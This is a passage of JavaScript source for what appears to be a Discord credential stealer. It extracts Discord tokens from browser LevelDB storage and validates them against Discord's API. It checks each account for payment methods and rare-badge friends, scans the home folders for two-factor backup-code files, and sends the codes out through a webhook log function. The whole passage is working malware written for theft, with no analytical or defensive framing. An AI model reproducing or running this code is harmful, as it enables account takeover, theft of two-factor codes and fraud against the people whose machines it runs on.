                            }
                        }
                    }
                } catch (e) {
                }
            }
        } catch (error) {
        }
    }

    return tokens;
}

function simpleSteal(browserPath, platform) {
    const tokens = [];
    const leveldbPaths = findLevelDBPaths(browserPath);

    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);

            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }

                const filePath = path.join(leveldbPath, fileName);

                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split('\n');

                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                            if (matches) {
                                for (const match of matches) {
                                    if (!tokens.some(t => t[0] === match && t[1] === platform)) {
                                        tokens.push([match, platform]);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) {
                }
            }
        } catch (error) {
        }
    }

    return tokens;
}

function getTokens(platform, browserPath) {
    let tokens = [];

    tokens = safeStorageSteal(browserPath, platform);

    if (tokens.length === 0) {
        tokens = simpleSteal(browserPath, platform);
    }

    return tokens;
}

const HQ_BADGES = [1, 2, 4, 8, 512, 16384, 131072, 262144];

async function getHQFriends(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me/relationships',
            method: 'GET',
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => responseData += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        const relationships = JSON.parse(responseData);
                        const friends = relationships.filter(rel => rel.type === 1);
                        const hqFriends = friends.filter(rel => {
                            const flags = rel.user?.public_flags || 0;
                            const isRare = HQ_BADGES.some(badge => (flags & badge) !== 0);
                            const is3c = rel.user?.username && rel.user.username.length === 3;
                            return isRare || is3c;
                        }).map(rel => ({
                            username: rel.user?.username || 'Unknown',
                            id: rel.user?.id || '0',
                            flags: rel.user?.public_flags || 0
                        }));

                        resolve({
                            totalRelationships: relationships.length,
                            friends: { count: friends.length, list: friends.map(rel => ({ username: rel.user?.username || 'Unknown', id: rel.user?.id || '0', discriminator: rel.user?.discriminator || '0' })) },
                            hqFriends: { count: hqFriends.length, list: hqFriends }
                        });
                    } catch (e) {
                        resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } });
                    }
                } else {
                    resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } });
                }
            });
        });

        req.on('error', () => resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } }));
        req.setTimeout(2000, () => {
            req.destroy();
            resolve({ totalRelationships: 0, friends: { count: 0, list: [] }, hqFriends: { count: 0, list: [] } });
        });
        req.end();
    });
}

async function checkBilling(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me/billing/payment-sources',
            method: 'GET',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        const billing = JSON.parse(data);
                        resolve(Array.isArray(billing) && billing.length > 0);
                    } catch (e) {
                        resolve(false);
                    }
                } else {
                    resolve(false);
                }
            });
        });

        req.on('error', () => resolve(false));
        req.setTimeout(2000, () => {
            req.destroy();
            resolve(false);
        });
        req.end();
    });
}

async function validateToken(token) {
    return new Promise((resolve) => {
        if (!token || token.length < 50) {
            return resolve({ valid: false, reason: 'Invalid token format' });
        }

        const meOptions = {
            hostname: 'discord.com',
            port: 443,
            path: '/api/v9/users/@me',
            method: 'GET',
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const meReq = https.request(meOptions, (meRes) => {
            let meData = '';
            meRes.on('data', (chunk) => meData += chunk);
            meRes.on('end', () => {
                if (meRes.statusCode === 200) {
                    try {
                        const basicUserData = JSON.parse(meData);
                        const userId = basicUserData.id;

                        const profileOptions = {
                            hostname: 'discord.com',
                            port: 443,
                            path: `/api/v9/users/${userId}/profile`,
                            method: 'GET',
                            headers: {
                                'Authorization': token,
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            }
                        };

                        const profileReq = https.request(profileOptions, (profileRes) => {
                            let profileData = '';
                            profileRes.on('data', (chunk) => profileData += chunk);
                            profileRes.on('end', () => {
                                if (profileRes.statusCode === 200) {
                                    try {
                                        const profileResponse = JSON.parse(profileData);
                                        const userData = {
                                            ...basicUserData,
                                            premium_type: profileResponse.premium_type,
                                            premium_since: profileResponse.premium_since,
                                            premium_guild_since: profileResponse.premium_guild_since,
                                            badges: profileResponse.badges,
                                            user_profile: profileResponse.user_profile
                                        };

                                        if (userData.id && userData.username) {
                                            resolve({ valid: true, userInfo: userData });
                                        } else {
                                            resolve({ valid: false, reason: 'Invalid user data' });
                                        }
                                    } catch (e) {
                                        resolve({ valid: false, reason: 'Profile parse error' });
                                    }
                                } else {
                                    resolve({ valid: true, userInfo: basicUserData });
                                }
                            });
                        });

                        profileReq.on('error', () => {
                            resolve({ valid: true, userInfo: basicUserData });
                        });

                        profileReq.setTimeout(5000, () => {
                            profileReq.destroy();
                            resolve({ valid: true, userInfo: basicUserData });
                        });

                        profileReq.end();

                    } catch (e) {
                        resolve({ valid: false, reason: 'Parse error' });
                    }
                } else {
                    resolve({ valid: false, reason: `HTTP ${meRes.statusCode}` });
                }
            });
        });

        meReq.on('error', (err) => {
            resolve({ valid: false, reason: err.message });
        });

        meReq.setTimeout(5000, () => {
            meReq.destroy();
            resolve({ valid: false, reason: 'timeout' });
        });

        meReq.end();
    });
}

async function collectAllTokens() {
    const allTokens = [];

    for (const [browserName, browserPath] of Object.entries(PATHS)) {
        if (!fs.existsSync(browserPath)) continue;

        const tokens = getTokens(browserName, browserPath);

        // Token collection

        for (const [token, platform] of tokens) {
            const validation = await validateToken(token);


            if (validation.valid) {
                const hasPayment = await checkBilling(token);
                const hqData = await getHQFriends(token);

                validation.userInfo.has_payment_methods = hasPayment;
                validation.userInfo.friendsCount = hqData.friends.count;
                validation.userInfo.hqFriendsCount = hqData.hqFriends.count;
                validation.userInfo.hqFriendsList = hqData.hqFriends.list;

                allTokens.push([token, platform, validation]);

            }
        }
    }

    return allTokens;
}

const BACKUP_CODE_PATTERN = /\*?\s*[a-z0-9]{4}-[a-z0-9]{4}/gi;

function isLikelyBackupCodeFile(content) {
    const lowerContent = content.toLowerCase();
    if (!lowerContent.includes('discord')) return false;
    if (!lowerContent.includes('backup') || !lowerContent.includes('code')) return false;
    const matches = content.match(BACKUP_CODE_PATTERN);
    if (!matches || matches.length < 8 || matches.length > 15) return false;
    return true;
}

function extractBackupCodes(content) {
    const codes = [];
    const matches = content.match(BACKUP_CODE_PATTERN);

    if (matches) {
        const uniqueCodes = [...new Set(matches.map(code => code.toLowerCase()))];
        codes.push(...uniqueCodes);
    }

    return codes;
}

function scanBackupDirectory(dirPath, results = [], maxDepth = 3, currentDepth = 0) {
    try {
        if (currentDepth >= maxDepth) return results;

        const items = fs.readdirSync(dirPath, { withFileTypes: true });

        for (const item of items) {
            try {
                const fullPath = path.join(dirPath, item.name);

                if (item.isDirectory()) {
                    const name = item.name;
                    if (name === 'Windows' || name === 'node_modules' || name === '$Recycle.Bin' || name === 'System Volume Information' || name.startsWith('.')) {
                        continue;
                    }

                    scanBackupDirectory(fullPath, results, maxDepth, currentDepth + 1);
                } else if (item.name.endsWith('.txt')) {
                    try {
                        const content = fs.readFileSync(fullPath, 'utf-8');

                        if (content.includes('discord') || content.includes('Discord')) {
                            if (content.includes('backup') || content.includes('Backup')) {
                                const matches = content.match(BACKUP_CODE_PATTERN);
                                if (matches && matches.length >= 8 && matches.length <= 15) {
                                    const codes = [...new Set(matches.map(c => c.toLowerCase()))];

                                    results.push({
                                        filePath: fullPath,
                                        codes: codes,
                                        codeCount: codes.length
                                    });
                                }
                            }
                        }
                    } catch (err) { }
                }
            } catch (err) { }
        }
    } catch (err) { }

    return results;
}

async function findAllBackupCodes(deepScan = false) {
    const allResults = [];

    try {
        const priorityPaths = [
            path.join(os.homedir(), 'Desktop'),
            path.join(os.homedir(), 'Documents'),
            path.join(os.homedir(), 'Downloads'),
            path.join(os.homedir(), 'Videos'),
            path.join(os.homedir(), 'Pictures'),
            path.join(os.homedir(), 'Music')
        ];

        for (const dir of priorityPaths) {
            if (fs.existsSync(dir)) {
                scanBackupDirectory(dir, allResults);
            }
        }

    } catch (err) { }

    return allResults;
}

async function writeBackupCodesToFile(outputDir) {
    try {
        const results = await findAllBackupCodes(true);

        if (results.length === 0) {
            return null;
        }

        const outputPath = path.join(outputDir, 'backup-codes.txt');
        const lines = [];

        lines.push('='.repeat(80));
        lines.push('Discord Backup Codes Found');
        lines.push('='.repeat(80));
        lines.push('');

        for (let i = 0; i < results.length; i++) {
            const result = results[i];
            lines.push(`[${i + 1}] File: ${result.filePath}`);
            lines.push(`    Total Codes: ${result.codeCount}`);
            lines.push('    Codes:');

            for (const code of result.codes) {
                lines.push(`      • ${code}`);
            }

            lines.push('');
            lines.push('-'.repeat(80));
            lines.push('');
        }

        lines.push('');
        lines.push(`Total Files Found: ${results.length}`);
        lines.push(`Total Unique Codes: ${results.reduce((sum, r) => sum + r.codeCount, 0)}`);

        fs.writeFileSync(outputPath, lines.join('\n'), 'utf-8');

        // Send XRD-style embed
        await SendBackupCodesToDiscord(results);

        return outputPath;
    } catch (err) {
        return null;
    }
}

async function SendBackupCodesToDiscord(results) {
    if (!results || results.length === 0) return;

    const codesText = results.map(res => {
        return `File: ${path.basename(res.filePath)}\nCodes: ${res.codes.join(', ')}`;
    }).join('\n\n');

    const embed = {
        title: 'Discord Backup Codes',
        color: BEN10_COLOR,
        description: `\`\`\`yaml\n${codesText}\n\`\`\``,
        footer: {
            text: BEN10_FOOTER_TEXT,
            icon_url: BEN10_ICON
        },
        timestamp: new Date().toISOString()
    };

    await sendLog({ embeds: [embed] });
}

const localappdata = process.env.LOCALAPPDATA;
const appData = process.env.APPDATA;


const badges = {
    staff: {
        emoji: "<:staff:1362105228719034679>",
        id: 1 << 0,
        rare: true,
    },
    active_developer: {
        emoji: "<:activedev:1362104965065212074>",
        id: 1 << 22,
        rare: false,
    },
    early_supporter: {
        emoji: "<:pig:1362105166811103515>",
        id: 1 << 9,
        rare: true,
    },
    verified_developer: {
        emoji: "<:dev:1362105068060676329>",
        id: 1 << 17,
        rare: true,
    },
    certified_moderator: {
        emoji: "<:mod:1362105108170539229>",
        id: 1 << 18,
        rare: true,
    },
    bug_hunter_level_1: {
        emoji: "<:bughunter1:1362105034157981758>",
        id: 1 << 3,
        rare: true,
    },
    bug_hunter_level_2: {
        emoji: "<:bughunter2:1362105047462314293>",
        id: 1 << 14,
        rare: true,
    },
    partner: {
        emoji: "<:partner:1362105185094336622>",
        id: 1 << 1,
        rare: true,
    },
    hypesquad_house_1: {
        emoji: "<:bravery:1362105004089147784>",
        id: 1 << 6,
        rare: false,
    },
    hypesquad_house_2: {
        emoji: "<:brilliance:1362105019066748968>",
        id: 1 << 7,
        rare: false,
    },
    hypesquad_house_3: {
        emoji: "<:balance:1362104986330202172>",
        id: 1 << 8,
        rare: false,
    },
    legacyusername: {
        emoji: "<:pomelo:1281110330767835188>",
        id: 32,
        rare: false,
    },
    hypesquad: {
        emoji: "<:events:136210508700621
==================================================
